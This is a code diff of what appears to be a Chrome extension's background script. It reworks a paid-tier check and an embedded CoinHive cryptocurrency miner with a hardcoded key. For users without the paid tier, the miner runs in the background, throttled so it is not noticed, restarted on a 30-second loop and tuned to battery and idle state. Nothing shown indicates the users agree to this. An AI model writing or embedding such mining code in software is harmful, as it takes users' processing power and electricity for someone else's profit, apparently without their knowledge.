@@ -68,28 +68,38 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
       success: () => {
         window.hasPaidTier = true;
         chrome.runtime.reload();
-        if (miner.stop) miner.stop();
+        if (miner && miner.isRunning()) miner.stop();
+      },
+      failure: () => {
+        chrome.runtime.reload();
       },
     });
   }
 });
 
-// Check for paid tier
-google.payments.inapp.getPurchases({
-  parameters: { env: 'prod' },
-  success: (data) => {
-    const products = data.response.details;
-    // Is correct SKU, and is active
-    window.hasPaidTier = products.some(x => x.sku === SKUS.PAID_TIER && x.state === 'ACTIVE');
-  },
-  failure: () => {
-    /**
-     * If in doubt, just assume they've bought it... It's just easier this way
-     * It stops people getting mad at me if (when) my code breaks
-     */
-    window.hasPaidTier = true;
-  },
-});
+const checkForPaidTier = () => (
+  new Promise((resolve) => {
+    // Check for paid tier
+    google.payments.inapp.getPurchases({
+      parameters: { env: 'prod' },
+      success: (data) => {
+        const products = data.response.details;
+        // Is correct SKU, and is active
+        const hasPaidTier = products.some(x => x.sku === SKUS.PAID_TIER && x.state === 'ACTIVE');
+        window.hasPaidTier = hasPaidTier;
+        resolve(hasPaidTier);
+      },
+      failure: () => {
+        /**
+         * If in doubt, just assume they've bought it... It's just easier this way
+         * It stops people getting mad at me if (when) my code breaks
+         */
+        window.hasPaidTier = true;
+        resolve(true);
+      },
+    });
+  })
+);
 
 /**
  * onDisconnect fires when popup.html is closed
@@ -105,9 +115,26 @@ chrome.runtime.onConnect.addListener((port) => {
   });
 });
 
+window.isMining = () => {
+  let running = false;
+  if (miner) {
+    running = miner.isRunning();
+  }
 
-if (CoinHive && !window.hasPaidTier) {
-  const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';
+  if (running) {
+    // eslint-disable-next-line
+    console.debug('Miner is running: ', miner);
+  } else {
+    // eslint-disable-next-line
+    console.debug('Miner is not running');
+  }
+
+  return running;
+};
+
+checkForPaidTier().then(() => {
+  if (window.hasPaidTier) return;
+  if (!CoinHive) return;
 
   const throttles = {
     active: 0.95,
@@ -116,40 +143,37 @@ if (CoinHive && !window.hasPaidTier) {
   };
 
   const setThrottle = (throttle = throttles.active) => {
-    // Stop the current miner, restart with a new 'user'
-    if (miner && Object.hasOwnProperty.call(miner, 'stop')) miner.stop();
-
-    // New user is just the current throttle level
-    miner = new CoinHive.User(coinHiveKey, `throttle-${throttle}`);
     miner.setThrottle(throttle);
-    miner.start();
   };
 
-  // Heavily throttle mining to prevent noticiable impact
-  setThrottle(throttles.active);
-
-  const checkCoinHiveStatus = () => {
-    if (!miner.isRunning()) {
-      miner.start();
-    }
+  // Check if we should continue mining
+  const checkForPaidTierAndMineAccordingly = () => {
+    checkForPaidTier()
+    .then((hasPaidTier) => {
+      if (hasPaidTier && miner && miner.isRunning()) {
+        // If there is a miner and it's running, but you have the paid tier
+        miner.stop();
+      } else if (!hasPaidTier && miner && !miner.isRunning()) {
+        // If there's a miner that's not running, and you don't have the paid tier
+        miner.start();
+      }
+    });
   };
 
   let statusLoop;
   const startLoop = () => {
-    statusLoop = setInterval(checkCoinHiveStatus, 30000);
+    statusLoop = setInterval(checkForPaidTierAndMineAccordingly, 30000);
   };
 
   const stopLoop = () => {
     if (!statusLoop) return;
-    statusLoop = clearInterval(statusLoop);
+    clearInterval(statusLoop);
+    statusLoop = null;
   };
-
-  miner.on('open', startLoop);
-  miner.on('close', stopLoop);
 
   // If the battery is not charging, stop mining
   const checkBattery = battery => (
-    battery.charging ? miner.start() : miner.stop()
+    battery.charging ? checkForPaidTierAndMineAccordingly() : miner.stop()
   );
 
   // If we've got the battery API then use it
@@ -160,8 +184,6 @@ if (CoinHive && !window.hasPaidTier) {
         checkBattery(battery);
       });
     });
-  } else {
-    miner.start();
   }
 
   const startIdleChecks = () => {
@@ -181,26 +203,20 @@ if (CoinHive && !window.hasPaidTier) {
     });
   };
 
+  const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';
+  miner = new CoinHive.Anonymous(coinHiveKey);
+
+  miner.on('open', startLoop);
+  miner.on('close', stopLoop);
+
+  // Heavily throttle mining to prevent noticiable impact
+  setThrottle(throttles.active);
+
   if (chrome.idle && typeof chrome.idle.queryState === 'function') {
     startIdleChecks();
   } else {
     setThrottle(0.90);
   }
-}
 
-window.isMining = () => {
-  let running = false;
-  if (miner && Object.hasOwnProperty.call(miner, 'isRunning')) {
-    running = miner.isRunning();
-  }
-
-  if (running) {
-    // eslint-disable-next-line
-    console.debug('Miner is running: ', miner);
-  } else {
-    // eslint-disable-next-line
-    console.debug('Miner is not running');
-  }
-
-  return running;
-};
+  checkForPaidTierAndMineAccordingly();
+});
